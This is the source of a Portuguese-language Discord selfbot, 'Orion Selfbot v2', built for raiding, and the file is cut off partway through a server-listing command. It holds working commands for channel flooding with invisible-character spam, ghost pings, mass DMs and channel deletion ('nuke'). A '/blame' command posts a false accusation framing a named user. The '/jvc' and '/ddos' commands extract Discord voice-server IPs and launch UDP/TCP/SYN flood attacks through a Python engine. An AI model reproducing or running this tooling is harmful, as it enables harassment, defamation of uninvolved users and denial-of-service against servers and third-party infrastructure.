/*
 * ██████  ██████  ██ ██████  ██    ██
 * ██   ██ ██   ██ ██ ██   ██ ██    ██
 * ██████  ██████  ██ ██████  ██    ██
 * ██   ██ ██   ██ ██ ██   ██ ██    ██
 * ██   ██ ██   ██ ██ ██   ██  ██████
 *
 * ORION SELFBOT v2.0 — DISCORD RAID & SPAM
 * Modo: Selfbot (funciona fora de servidores, via DMs)
 * Uso exclusivo: /comando nos DMs do bot
 *
 * AVISO: Selfbot é contra os ToS do Discord.
 * Use por sua conta e risco.
 */

const { Client } = require('discord.js-selfbot-v13');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const axios = require('axios');
const { exec, spawn } = require('child_process');
const net = require('net');
const dns = require('dns');

// ─── CONFIG ───────────────────────────────────────────────────────────────────
const CONFIG = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'));
const TOKEN = CONFIG.token;
const PREFIX = CONFIG.prefix || '/';
const SPAM_FILE = CONFIG.spam_file;
const RAID_DEFAULT = CONFIG.raid_default_count || 20;
const COOLDOWN = CONFIG.cooldown || 0;

// ─── CLIENT ───────────────────────────────────────────────────────────────────
const client = new Client({
  checkUpdate: false,
  sync: false,
  presence: false
});

// ─── HELPERS ──────────────────────────────────────────────────────────────────
function log(type, msg) {
  const t = new Date().toLocaleTimeString('pt-BR', { hour12: false });
  const colors = {
    info: chalk.cyan,
    ok: chalk.green,
    warn: chalk.yellow,
    error: chalk.red,
    cmd: chalk.magenta,
    spam: chalk.redBright,
    raid: chalk.red.bold
  };
  const c = colors[type] || chalk.white;
  console.log(c(`[${t}] [${type.toUpperCase()}] ${msg}`));
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function loadSpamLines() {
  try {
    if (!fs.existsSync(SPAM_FILE)) {
      log('warn', `Arquivo de spam não encontrado: ${SPAM_FILE}`);
      return ['@everyone @here Orion Raid!'];
    }
    const data = fs.readFileSync(SPAM_FILE, 'utf8');
    const lines = data.split('\n').filter(l => l.trim().length > 0 && !l.trim().startsWith('-'));
    if (lines.length === 0) return ['@everyone @here Orion Raid!'];
    return lines;
  } catch (e) {
    log('error', `Erro lendo spam file: ${e.message}`);
    return ['@everyone @here Orion Raid!'];
  }
}

function generateZalgo(text, intensity = 1) {
  const combining = [
    '\u0300','\u0301','\u0302','\u0303','\u0304','\u0305','\u0306','\u0307','\u0308',
    '\u0309','\u030A','\u030B','u030C','\u030D','\u030E','u030F','\u0310','\u0311',
    '\u0312','\u0313','\u0314','\u0315','\u0316','\u0317','\u0318','\u0319','\u031A',
    '\u031B','\u031C','\u031D','\u031E','\u031F','\u0320','\u0321','\u0322','\u0323',
    '\u0324','\u0325','\u0326','\u0327','\u0328','\u0329','\u032A','\u032B','\u032C',
    '\u032D','\u032E','\u032F','\u0330','\u0331','\u0332','\u0333','\u0334','\u0335',
    '\u0336','\u0337','\u0338','\u0339','\u033A','\u033B','\u033C','\u033D','\u033E',
    '\u033F','\u0340','\u0341','\u0342','\u0343','\u0344','\u0345','\u0346','\u0347',
    '\u0348','\u0349','\u034A','\u034B','\u034C','\u034D','\u034E','\u034F'
  ];
  let result = '';
  for (let char of text) {
    result += char;
    for (let i = 0; i < intensity; i++) {
      result += combining[Math.floor(Math.random() * combining.length)];
    }
  }
  return result;
}

function generatePollutedMessage(base) {
  const invisibleChars = [
    '\u200B', '\u200C', '\u200D', '\u200E', '\u200F',
    '\uFEFF', '\u2060', '\u2061', '\u2062', '\u2063', '\u2064',
    '\u180E', '\u00AD', '\u061C',
    '\u17B5', '\u17B4',
    '\u034F', '\u115F', '\u1160'
  ];
  const fillers = [
    'ㅤ'.repeat(Math.floor(Math.random() * 20) + 5),
    '𒐫'.repeat(Math.floor(Math.random() * 30) + 10),
    '࿓'.repeat(Math.floor(Math.random() * 15) + 5),
    'ᅟ'.repeat(Math.floor(Math.random() * 25) + 5)
  ];
  let msg = base + '\n';
  for (let i = 0; i < Math.floor(Math.random() * 5) + 2; i++) {
    msg += fillers[Math.floor(Math.random() * fillers.length)] + '\n';
  }
  // Add random invisible chars
  for (let i = 0; i < Math.floor(Math.random() * 50) + 20; i++) {
    msg += invisibleChars[Math.floor(Math.random() * invisibleChars.length)];
  }
  return msg;
}

// ─── COMMAND HANDLER ─────────────────────────────────────────────────────────
const commands = new Map();

function register(name, fn, opts = {}) {
  commands.set(name, { fn, ...opts });
}

// ─── COMMAND: /blame ──────────────────────────────────────────────────────────
register('blame', async (msg, args) => {
  // /blame @user [motivo]
  const target = msg.mentions.users.first();
  const reason = args.slice(1).join(' ') || 'raidar o servidor';
  if (!target) {
    return msg.reply('❌ Marque alguem pra culpar. Ex: `/blame @user motivo`');
  }
  const blameMsg = [
    `🚨 **ALERTA DE RAID!** 🚨`,
    ``,
    `O ${target} foi responsavel pelo raid no servidor!`,
    `**Motivo:** ${reason}`,
    ``,
    `🔹 Nao confie no ${target}`,
    `🔹 Reportem ele para a administracao`,
    `🔹 Ele esta usando bots para derrubar o server`,
    ``,
    `**Assinado:** Orion Selfbot v2`,
    `<@${target.id}> @everyone @here`
  ].join('\n');

  // Send to current channel (DM or guild)
  await msg.channel.send(blameMsg);
  log('cmd', `/blame -> ${target.tag} por "${reason}"`);
}, { usage: '/blame @user [motivo]', desc: 'Culpa alguem pelo raid' });

// ─── COMMAND: /raid ───────────────────────────────────────────────────────────
register('raid', async (msg, args) => {
  // /raid <channel_id> [quantidade] [mensagem]
  const channelId = args[0];
  let count = parseInt(args[1]) || RAID_DEFAULT;
  const customMsg = args.slice(2).join(' ') || null;

  if (!channelId) {
    return msg.reply('❌ Use: `/raid <channel_id> [quantidade] [mensagem]`');
  }

  let targetChannel;
  try {
    targetChannel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido ou inacessivel.');
  }

  if (!targetChannel || !targetChannel.isText()) {
    return msg.reply('❌ Canal invalido ou nao e um canal de texto.');
  }

  if (count > 200) count = 200;

  const spamLines = loadSpamLines();
  const baseMsg = customMsg || spamLines[Math.floor(Math.random() * spamLines.length)];

  await msg.reply(`🔥 **Iniciando raid no canal ${targetChannel.name}**\n📨 Mensagens: ${count}\n⏱ Iniciando...`);

  let sent = 0;
  let failed = 0;

  for (let i = 0; i < count; i++) {
    try {
      let messageToSend;
      if (customMsg) {
        messageToSend = generatePollutedMessage(customMsg);
      } else {
        const line = spamLines[Math.floor(Math.random() * spamLines.length)];
        messageToSend = generatePollutedMessage(line);
      }
      await targetChannel.send(messageToSend);
      sent++;
      log('raid', `[${sent}/${count}] Mensagem enviada para #${targetChannel.name}`);
      if (COOLDOWN > 0) await sleep(COOLDOWN);
      else await sleep(Math.floor(Math.random() * 200) + 50); // anti rate-limit
    } catch (e) {
      failed++;
      log('error', `Falha ao enviar mensagem ${i+1}: ${e.message}`);
      if (e.message.includes('rate')) {
        log('warn', 'Rate limit! Aguardando 5s...');
        await sleep(5000);
      }
    }
  }

  await msg.channel.send(`✅ **Raid concluido!**\n📨 Enviadas: ${sent}\n❌ Falhas: ${failed}`);
}, { usage: '/raid <channel_id> [quantidade] [msg]', desc: 'Envia N mensagens no canal' });

// ─── COMMAND: /gping ─────────────────────────────────────────────────────────
register('gping', async (msg, args) => {
  // /gping @user [quantidade]
  const target = msg.mentions.users.first();
  let count = parseInt(args[1]) || 5;

  if (!target) {
    return msg.reply('❌ Marque alguem. Ex: `/gping @user 10`');
  }

  if (count > 100) count = 100;
  const channel = msg.channel;

  await msg.reply(`👻 **Ghost Ping** em ${target.tag} (${count}x)`);

  let sent = 0;
  for (let i = 0; i < count; i++) {
    try {
      const pingMsg = await channel.send(`<@${target.id}>`);
      await pingMsg.delete();
      sent++;
      await sleep(Math.floor(Math.random() * 150) + 50);
    } catch (e) {
      log('error', `Ghost ping falhou: ${e.message}`);
    }
  }

  await msg.channel.send(`✅ Ghost ping concluido: ${sent} pings em ${target.tag}`);
  log('cmd', `/gping -> ${target.tag} ${sent}x`);
}, { usage: '/gping @user [quantidade]', desc: 'Ghost ping (pinga e deleta)' });

// ─── COMMAND: /invite ─────────────────────────────────────────────────────────
register('invite', async (msg, args) => {
  // /invite [channel_id]
  const channelId = args[0] || msg.channel.id;
  let targetChannel;

  try {
    targetChannel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido.');
  }

  try {
    const invite = await targetChannel.createInvite({
      maxAge: 0,
      maxUses: 0,
      reason: 'Orion Selfbot - Invite Generator'
    });
    await msg.reply(`🔗 **Invitado gerado:** https://discord.gg/${invite.code}`);
    log('cmd', `/invite -> discord.gg/${invite.code} para #${targetChannel.name}`);
  } catch (e) {
    // Try without permissions — just return channel link
    await msg.reply(`🔗 Link do canal: https://discord.com/channels/${targetChannel.guild?.id || '@me'}/${targetChannel.id}`);
  }
}, { usage: '/invite [channel_id]', desc: 'Gera invite para o canal' });

// ─── COMMAND: /spam ──────────────────────────────────────────────────────────
register('spam', async (msg, args) => {
  // /spam <channel_id> [quantidade]
  const channelId = args[0];
  let count = parseInt(args[1]) || 50;

  if (!channelId) {
    return msg.reply('❌ Use: `/spam <channel_id> [quantidade]`');
  }

  let targetChannel;
  try {
    targetChannel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido ou inacessivel.');
  }

  if (!targetChannel.isText()) {
    return msg.reply('❌ Canal invalido.');
  }

  if (count > 500) count = 500;

  const spamLines = loadSpamLines();
  await msg.reply(`💬 **Spam iniciado em #${targetChannel.name}**\n📨 ${count} mensagens do arquivo de texto`);

  let sent = 0;
  let failed = 0;
  let lineIndex = 0;

  for (let i = 0; i < count; i++) {
    try {
      const line = spamLines[lineIndex % spamLines.length];
      const polluted = generatePollutedMessage(line);
      await targetChannel.send(polluted);
      sent++;
      lineIndex++;
      log('spam', `[${sent}/${count}] Spam em #${targetChannel.name}`);
      await sleep(Math.floor(Math.random() * 100) + 30);
    } catch (e) {
      failed++;
      if (e.message.includes('rate')) {
        log('warn', 'Rate limit! Aguardando 5s...');
        await sleep(5000);
      }
    }
  }

  await msg.channel.send(`✅ **Spam concluido!**\n📨 Enviadas: ${sent}\n❌ Falhas: ${failed}`);
}, { usage: '/spam <channel_id> [quantidade]', desc: 'Spam com texto do arquivo' });

// ─── COMMAND: /massdm ─────────────────────────────────────────────────────────
register('massdm', async (msg, args) => {
  // /massdm <mensagem>
  if (args.length === 0) {
    return msg.reply('❌ Use: `/massdm <mensagem>`');
  }
  const message = args.join(' ');

  await msg.reply('📨 **Coletando amigos para Mass DM...**');

  let sent = 0;
  let failed = 0;
  const friends = [...client.users.cache.values()].filter(u => !u.bot);

  let i = 0;
  for (const user of friends) {
    try {
      await user.send(message);
      sent++;
      log('cmd', `MassDM para ${user.tag}`);
      i++;
      if (i >= 50) break; // limit to 50 to avoid abuse
      await sleep(1500); // delay to avoid rate limit
    } catch (e) {
      failed++;
    }
  }

  await msg.channel.send(`✅ **Mass DM concluido!**\n📨 Enviadas: ${sent}\n❌ Falhas: ${failed}`);
}, { usage: '/massdm <mensagem>', desc: 'Envia DM para todos os amigos' });

// ─── COMMAND: /nuke ──────────────────────────────────────────────────────────
register('nuke', async (msg, args) => {
  // /nuke <channel_id> [nome]
  const channelId = args[0];
  const newName = args.slice(1).join('-').replace(/[^a-zA-Z0-9-]/g, '') || 'nuked-by-orion';

  if (!channelId) {
    return msg.reply('❌ Use: `/nuke <channel_id> [novo_nome]`');
  }

  let channel;
  try {
    channel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido.');
  }

  if (!channel.guild) {
    return msg.reply('❌ Isso so funciona em servidores.');
  }

  try {
    const cloned = await channel.clone({ reason: 'Orion Nuke' });
    await channel.delete(`Orion Nuke by ${msg.author.tag}`);
    await cloned.setName(newName);
    await cloned.send(`💥 **Canal nukado por ${msg.author.tag}!**\n@everyone @here Orion Selfbot v2`);
    await msg.reply(`✅ **Canal nukado!**\n🆕 Novo canal: #${newName}`);
    log('cmd', `/nuke -> #${channel.name} (${channel.id})`);
  } catch (e) {
    await msg.reply(`❌ Erro ao nukar: ${e.message}`);
  }
}, { usage: '/nuke <channel_id> [nome]', desc: 'Clona e deleta o canal' });

// ─── COMMAND: /webhookraid ────────────────────────────────────────────────────
register('webhookraid', async (msg, args) => {
  // /webhookraid <webhook_url> [quantidade] [mensagem]
  const webhookUrl = args[0];
  let count = parseInt(args[1]) || 20;
  const customMsg = args.slice(2).join(' ') || '@everyone @here **Orion Webhook Raid!**';

  if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks/')) {
    return msg.reply('❌ Use: `/webhookraid <webhook_url> [quantidade] [mensagem]`');
  }

  if (count > 500) count = 500;

  await msg.reply(`🔥 **Webhook Raid iniciado!**\n📨 ${count} mensagens`);

  let sent = 0;
  let failed = 0;

  for (let i = 0; i < count; i++) {
    try {
      const content = customMsg
        ? generatePollutedMessage(customMsg)
        : generatePollutedMessage(`@everyone @here Orion Raid #${i+1}`);

      // Randomize username too
      const usernames = ['Orion', 'RAID BOT', 'SYSTEM', 'NUKE', 'DESTROYER', 'CRASHER', 'ANONYMOUS'];
      const randomName = usernames[Math.floor(Math.random() * usernames.length)];

      await axios.post(webhookUrl, {
        content: content,
        username: randomName,
        avatar_url: 'https://cdn.discordapp.com/attachments/0/0/orion_raid.png'
      }, {
        headers: { 'Content-Type': 'application/json' }
      });

      sent++;
      log('raid', `[${sent}/${count}] Webhook enviado`);
      await sleep(Math.floor(Math.random() * 150) + 50);
    } catch (e) {
      failed++;
      if (e.response?.status === 429) {
        log('warn', 'Rate limit na webhook! Aguardando...');
        await sleep(5000);
      }
    }
  }

  await msg.channel.send(`✅ **Webhook Raid concluido!**\n📨 Enviadas: ${sent}\n❌ Falhas: ${failed}`);
}, { usage: '/webhookraid <url> [qtd] [msg]', desc: 'Raid via webhook' });

// ─── COMMAND: /clean ─────────────────────────────────────────────────────────
register('clean', async (msg, args) => {
  // /clean [quantidade]
  let count = parseInt(args[0]) || 10;
  if (count > 100) count = 100;

  if (!msg.channel.guild) {
    // In DMs, can only delete bot's own messages via bulk delete
    return msg.reply('❌ So funciona em servidores.');
  }

  try {
    const fetched = await msg.channel.messages.fetch({ limit: count });
    const ownMessages = fetched.filter(m => m.author.id === client.user.id);
    if (ownMessages.size === 0) {
      return msg.reply('Nenhuma mensagem minha encontrada.');
    }
    await msg.channel.bulkDelete(ownMessages, true);
    const reply = await msg.channel.send(`✅ **${ownMessages.size} mensagens limpas!**`);
    log('cmd', `/clean -> ${ownMessages.size} mensagens`);
    setTimeout(() => reply.delete().catch(() => {}), 3000);
  } catch (e) {
    msg.reply(`❌ Erro: ${e.message}`);
  }
}, { usage: '/clean [quantidade]', desc: 'Limpa suas mensagens no canal' });

// ─── COMMAND: /status ────────────────────────────────────────────────────────
register('status', async (msg, args) => {
  // /status <tipo> <texto>
  const typeMap = {
    'playing': 'PLAYING',
    'streaming': 'STREAMING',
    'listening': 'LISTENING',
    'watching': 'WATCHING',
    'competing': 'COMPETING'
  };

  const typeArg = (args[0] || 'playing').toLowerCase();
  const statusType = typeMap[typeArg] || 'PLAYING';
  const text = args.slice(1).join(' ') || 'Orion Selfbot v2';

  try {
    await client.user.setPresence({
      activities: [{
        name: text,
        type: statusType,
        url: statusType === 'STREAMING' ? 'https://twitch.tv/orion' : undefined
      }],
      status: 'dnd'
    });
    await msg.reply(`✅ Status alterado para **${statusType} ${text}**`);
    log('cmd', `/status -> ${statusType} ${text}`);
  } catch (e) {
    msg.reply(`❌ Erro: ${e.message}`);
  }
}, { usage: '/status <playing|streaming|watching|listening> <texto>', desc: 'Altera seu status' });

// ─── COMMAND: /tokeninfo ────────────────────────────────────────────────────
register('tokeninfo', async (msg, args) => {
  const user = client.user;
  const info = [
    `**📌 INFORMACOES DO TOKEN**`,
    ``,
    `**Usuario:** ${user.tag}`,
    `**ID:** ${user.id}`,
    `**Email:** ${user.email || 'N/A'}`,
    `**Criado em:** ${user.createdAt.toLocaleDateString('pt-BR')}`,
    `**Verificado:** ${user.verified ? '✅ Sim' : '❌ Nao'}`,
    `**2FA:** ${user.mfaEnabled ? '✅ Sim' : '❌ Nao'}`,
    `**Bot:** ${user.bot ? 'Sim' : 'Nao (Conta de usuario)'}`,
    `**Servidores:** ${client.guilds.cache.size}`,
    `**Amigos:** ${client.users.cache.filter(u => !u.bot).size}`,
    ``,
    `**🛡 Orion Selfbot v2**`
  ].join('\n');

  await msg.reply(info);
  log('cmd', `/tokeninfo -> ${user.tag}`);
}, { usage: '/tokeninfo', desc: 'Mostra info do token logado' });

// ─── COMMAND: /join ──────────────────────────────────────────────────────────
register('join', async (msg, args) => {
  // /join <invite_code>
  const inviteCode = args[0]?.replace('https://discord.gg/', '').replace('discord.gg/', '');

  if (!inviteCode) {
    return msg.reply('❌ Use: `/join <codigo_do_convite>`');
  }

  try {
    const invite = await client.fetchInvite(inviteCode);
    const guildName = invite.guild?.name || 'Servidor';
    await msg.reply(`📥 **Entrando em ${guildName}...**`);
    // For selfbots, we use the API directly
    const response = await axios.post(
      `https://discord.com/api/v10/invites/${inviteCode}`,
      {},
      {
        headers: {
          'Authorization': TOKEN,
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );
    await msg.reply(`✅ **Entrou em ${guildName} com sucesso!**`);
    log('cmd', `/join -> ${guildName}`);
  } catch (e) {
    if (e.response?.status === 400) {
      msg.reply('❌ Convite invalido ou expirado.');
    } else {
      msg.reply(`❌ Erro: ${e.message}`);
    }
  }
}, { usage: '/join <invite>', desc: 'Entra em um servidor via invite' });

// ─── COMMAND: /jvc ──────────────────────────────────────────────────────────
// Joins voice channel and DDoS the voice server IP
let activeJVCAttacks = new Map(); // guildId -> { process, channelId }

register('jvc', async (msg, args) => {
  // /jvc <channel_id> [guild_id] [threads] [duration]
  const channelId = args[0];
  const guildId = args[1] || msg.guild?.id;
  let threads = parseInt(args[2]) || 300;
  let duration = parseInt(args[3]) || 120;

  if (!channelId) {
    return msg.reply('❌ Use: `/jvc <channel_id> [guild_id] [threads] [duration]`\nEx: `/jvc 123456789 987654321 500 180`');
  }

  let channel;
  try {
    if (guildId) {
      const guild = await client.guilds.fetch(guildId).catch(() => null);
      if (guild) {
        channel = guild.channels.cache.get(channelId) || await guild.channels.fetch(channelId).catch(() => null);
      }
    }
    if (!channel) {
      channel = await client.channels.fetch(channelId);
    }
  } catch (e) {
    return msg.reply('❌ Canal invalido ou inacessivel.');
  }

  if (channel.type !== 'GUILD_VOICE' && channel.type !== 'GUILD_STAGE_VOICE') {
    return msg.reply('❌ Isso nao e um canal de voz.');
  }

  const guild = channel.guild;
  if (!guild) return msg.reply('❌ Canal sem servidor.');

  // Check if already attacking this guild
  if (activeJVCAttacks.has(guild.id)) {
    return msg.reply(`⚠️ Ja existe um ataque ativo neste servidor! Use \`/jvcstop ${guild.id}\` para parar.`);
  }

  await msg.reply(`🔊 **Conectando ao canal de voz ${channel.name}...`);

  try {
    // Join voice channel
    const connection = await channel.join();
    
    // Get voice server info from the connection
    // discord.js-selfbot-v13 provides voice connection with endpoint
    await msg.reply(`✅ **Conectado a call!**\n\n🔍 **Obtendo informacoes do servidor de voz...**`);

    // The connection object has various properties
    // For selfbot, we can get the voice server info from the voice state
    // The endpoint typically looks like: xxx.discord.media
    
    let voiceEndpoint = null;
    let voiceIp = null;
    let voicePort = null;

    // Method 1: Get from the connection adapter
    try {
      if (connection.endpoint) {
        voiceEndpoint = connection.endpoint;
      } else if (connection.voice?.server?.endpoint) {
        voiceEndpoint = connection.voice.server.endpoint;
      } else if (connection.udp?.ip) {
        voiceIp = connection.udp.ip;
        voicePort = connection.udp.port || 443;
      }
    } catch (e) {
      log('warn', `Nao foi possivel obter endpoint da connection: ${e.message}`);
    }

    // Method 2: Try to get from voice state
    if (!voiceEndpoint && !voiceIp) {
      try {
        const voiceStates = guild.voiceStates.cache;
        const myState = voiceStates.get(client.user.id);
        if (myState && myState.channelId === channel.id) {
          // Try to get voice server from the session
          const server = myState.voice?.server || myState._voice?.server;
          if (server?.endpoint) {
            voiceEndpoint = server.endpoint;
          }
        }
      } catch (e) {
        log('warn', `Nao foi possivel obter voice state: ${e.message}`);
      }
    }

    // Method 3: DNS resolve known Discord voice IPs as fallback
    if (!voiceEndpoint && !voiceIp) {
      // Try to use the websocket connection info
      try {
        const guildData = await axios.get(`https://discord.com/api/v10/guilds/${guild.id}/voice-states/${client.user.id}`, {
          headers: {
            'Authorization': TOKEN,
            'User-Agent': 'Mozilla/5.0'
          }
        });
        if (guildData.data?.voice?.endpoint) {
          voiceEndpoint = guildData.data.voice.endpoint;
        }
      } catch (e) {
        log('warn', `Nao foi possivel obter voice state via API: ${e.message}`);
      }
    }

    if (!voiceEndpoint && !voiceIp) {
      // As last resort, parse from connection debug info
      const connStr = connection.toString ? connection.toString() : '';
      const match = connStr.match(/([\w-]+\.discord\.media)[:\s]*(\d+)?/i);
      if (match) {
        voiceEndpoint = match[1];
        voicePort = match[2] ? parseInt(match[2]) : null;
      }
    }

    if (!voiceEndpoint && !voiceIp) {
      await msg.reply(`⚠️ **Conectado a call mas nao foi possivel extrair o IP do servidor de voz.**\n\n📋 Info bruta da conexao:\n\`\`\`${JSON.stringify({
        connected: !!connection,
        endpoint: connection.endpoint || 'N/A',
        channel: channel.name,
        guild: guild.name
      }, null, 2)}\`\`\`\n\nTente usar \`/jvcdebug\` para mais informacoes.`);
      return;
    }

    // Resolve hostname to IP if needed
    if (voiceEndpoint && !voiceIp) {
      // Remove port if present in endpoint
      const hostname = voiceEndpoint.replace(/:\d+$/, '').split(':')[0];
      try {
        const addresses = await new Promise((resolve, reject) => {
          dns.resolve4(hostname, (err, addresses) => {
            if (err) reject(err);
            else resolve(addresses);
          });
        });
        voiceIp = addresses[0];
      } catch (e) {
        // Fallback: try to resolve with Node's dns
        try {
          const addr = await dns.promises.resolve4(hostname);
          voiceIp = addr[0];
        } catch (e2) {
          return msg.reply(`❌ **Conectado a call, mas nao foi possivel resolver o IP do servidor de voz.**\nEndpoint: ${voiceEndpoint}\nErro DNS: ${e2.message}\n\nTente manualmente: resolva \`${voiceEndpoint}\` para IP e use \`/ddos <ip> <port>\``);
        }
      }
    }

    // Extract port
    if (!voicePort) {
      if (voiceEndpoint && voiceEndpoint.includes(':')) {
        voicePort = parseInt(voiceEndpoint.split(':')[1]) || 443;
      } else {
        voicePort = 443; // Default Discord voice port
      }
    }

    const attackInfo = {
      targetIp: voiceIp,
      targetPort: voicePort,
      hostname: voiceEndpoint || 'N/A',
      guildName: guild.name,
      channelName: channel.name,
      threads: threads,
      duration: duration
    };

    const infoMsg = [
      `🎯 **ALVO CAPTURADO!**`,
      ``,
      `**Servidor:** ${attackInfo.guildName}`,
      `**Call:** ${attackInfo.channelName}`,
      `**Hostname:** ${attackInfo.hostname}`,
      `**IP:** ${attackInfo.targetIp}`,
      `**Porta:** ${attackInfo.targetPort}`,
      `**Threads:** ${attackInfo.threads}`,
      `**Duracao:** ${attackInfo.duration}s`,
      ``,
      `🔥 **Iniciando DDoS em 3 segundos...**`
    ].join('\n');

    await msg.channel.send(infoMsg);

    // Launch the DDoS engine as a subprocess
    const ddosScript = path.join(__dirname, 'ddos_engine.py');
    const attackType = 'mixed'; // Use mixed UDP/TCP for best effect
    
    const ddosProcess = spawn('python3', [
      ddosScript,
      attackInfo.targetIp,
      String(attackInfo.targetPort),
      String(attackInfo.threads),
      String(attackInfo.duration),
      attackType
    ], {
      cwd: __dirname,
      detached: false
    });

    // Track the attack
    activeJVCAttacks.set(guild.id, {
      process: ddosProcess,
      channelId: channel.id,
      targetIp: attackInfo.targetIp,
      targetPort: attackInfo.targetPort,
      startTime: Date.now()
    });

    // Log output
    ddosProcess.stdout.on('data', (data) => {
      log('raid', `[DDoS ${attackInfo.targetIp}] ${data.toString().trim()}`);
    });

    ddosProcess.stderr.on('data', (data) => {
      const line = data.toString().trim();
      if (line) log('raid', `[DDoS] ${line}`);
    });

    ddosProcess.on('close', (code) => {
      log('ok', `DDoS finalizado (codigo ${code}) para ${attackInfo.targetIp}`);
      activeJVCAttacks.delete(guild.id);
      msg.channel.send(`✅ **Ataque DDoS finalizado!**\n📍 Alvo: ${attackInfo.targetIp}:${attackInfo.targetPort}\n⏱ Duracao: ${attackInfo.duration}s\n💀 Codigo: ${code}`).catch(() => {});
    });

    ddosProcess.on('error', (err) => {
      log('error', `Erro no DDoS: ${err.message}`);
      activeJVCAttacks.delete(guild.id);
      msg.channel.send(`❌ **Erro no DDoS:** ${err.message}`).catch(() => {});
    });

    log('cmd', `/jvc -> ${attackInfo.targetIp}:${attackInfo.targetPort} em ${guild.name}`);

  } catch (e) {
    await msg.reply(`❌ **Erro ao entrar na call:** ${e.message}\n\nVerifique se o token tem permissao de voz.`);
  }
}, { usage: '/jvc <channel_id> [guild_id] [threads] [duration]', desc: 'Entra na call, captura IP e inicia DDoS' });

// ─── COMMAND: /jvcstop ─────────────────────────────────────────────────────
register('jvcstop', async (msg, args) => {
  // /jvcstop [guild_id]
  const guildId = args[0] || msg.guild?.id;

  if (!guildId) {
    return msg.reply('❌ Use: `/jvcstop <guild_id>`');
  }

  const attack = activeJVCAttacks.get(guildId);
  if (!attack) {
    return msg.reply('❌ Nenhum ataque ativo neste servidor.');
  }

  try {
    attack.process.kill('SIGINT');
    setTimeout(() => {
      try { attack.process.kill('SIGKILL'); } catch (e) {}
    }, 3000);
  } catch (e) {
    log('error', `Erro ao parar DDoS: ${e.message}`);
  }

  activeJVCAttacks.delete(guildId);

  // Also leave voice
  try {
    const guild = client.guilds.cache.get(guildId);
    if (guild) {
      const connection = client.voice?.connections?.get(guildId);
      if (connection) connection.disconnect();
    }
  } catch (e) {}

  await msg.reply(`⏹ **Ataque DDoS parado!**\n📍 Alvo: ${attack.targetIp}:${attack.targetPort}\n⏱ Duracao: ${Math.floor((Date.now() - attack.startTime)/1000)}s`);
  log('cmd', `/jvcstop -> ${guildId}`);
}, { usage: '/jvcstop [guild_id]', desc: 'Para o ataque DDoS ativo' });

// ─── COMMAND: /jvclist ─────────────────────────────────────────────────────
register('jvclist', async (msg, args) => {
  if (activeJVCAttacks.size === 0) {
    return msg.reply('❌ Nenhum ataque DDoS ativo no momento.');
  }

  let list = `**🔥 ATAQUES ATIVOS (${activeJVCAttacks.size})**\n\n`;
  activeJVCAttacks.forEach((attack, guildId) => {
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    const guild = client.guilds.cache.get(guildId);
    list += `**${guild?.name || 'N/A'}** (${guildId})\n`;
    list += `├ Alvo: ${attack.targetIp}:${attack.targetPort}\n`;
    list += `├ Tempo: ${elapsed}s\n`;
    list += `└ Canal: <#${attack.channelId}>\n\n`;
  });

  await msg.reply(list);
  log('cmd', `/jvclist -> ${activeJVCAttacks.size} ataques`);
}, { usage: '/jvclist', desc: 'Lista ataques DDoS ativos' });

// ─── COMMAND: /ddos ─────────────────────────────────────────────────────────
register('ddos', async (msg, args) => {
  // /ddos <ip> <port> [threads] [duration] [type]
  const targetIp = args[0];
  const targetPort = parseInt(args[1]) || 443;
  let threads = parseInt(args[2]) || 200;
  let duration = parseInt(args[3]) || 60;
  const attackType = args[4] || 'mixed';

  if (!targetIp) {
    return msg.reply('❌ Use: `/ddos <ip> <port> [threads] [duration] [type]`\nTipos: udp, tcp, syn, mixed');
  }

  if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(targetIp)) {
    return msg.reply('❌ IP invalido. Use formato IPv4.');
  }

  if (threads > 2000) threads = 2000;
  if (duration > 600) duration = 600;

  await msg.reply(`🔥 **DDoS iniciado!**\n📍 ${targetIp}:${targetPort}\n🧵 ${threads} threads\n⏱ ${duration}s\n📦 ${attackType}`);

  const ddosScript = path.join(__dirname, 'ddos_engine.py');
  const ddosProcess = spawn('python3', [
    ddosScript,
    targetIp,
    String(targetPort),
    String(threads),
    String(duration),
    attackType
  ], { cwd: __dirname });

  ddosProcess.stderr.on('data', (data) => {
    const line = data.toString().trim();
    if (line) log('raid', `[DDoS] ${line}`);
  });

  ddosProcess.on('close', (code) => {
    msg.channel.send(`✅ **DDoS finalizado!** (codigo ${code})`).catch(() => {});
  });

  ddosProcess.on('error', (err) => {
    msg.reply(`❌ Erro: ${err.message}`);
  });
}, { usage: '/ddos <ip> <port> [threads] [duration] [type]', desc: 'Inicia ataque DDoS manual' });

// ─── COMMAND: /leave ─────────────────────────────────────────────────────────
register('leave', async (msg, args) => {
  // /leave [guild_id]
  const guildId = args[0] || msg.guild?.id;
  if (!guildId) {
    return msg.reply('❌ Use: `/leave <guild_id>`');
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) {
    return msg.reply('❌ Servidor nao encontrado.');
  }

  try {
    await guild.leave();
    await msg.reply(`✅ Saiu do servidor **${guild.name}**`);
    log('cmd', `/leave -> ${guild.name}`);
  } catch (e) {
    msg.reply(`❌ Erro: ${e.message}`);
  }
}, { usage: '/leave [guild_id]', desc: 'Sai de um servidor' });

// ─── COMMAND: /servers ──────────────────────────────────────────────────────
register('servers', async (msg, args) => {
  const guilds = client.guilds.cache;
  let list = `**📋 SERVERS (${guilds.size})**\n\n`;

  guilds.forEach(g => {
    const owner = g.members.cache.get(g.ownerId);
    list += `**${g.name}** (${g.id})\n`;
    list += `├ Membros: ${g.memberCount}\n`;
    list += `├ Dono: ${owner?.user?.tag || 'N/A'}\n`;
    list += `├ Canais: ${g.channels.cache.size}\n`;
    const invite = `https://discord.com/channels/${g.id}`;
    list += `└ Link: ${invite}\n\n`;
  });

  // Paginate if needed (discord limit 2000 chars)
  if (list.length > 1900) {
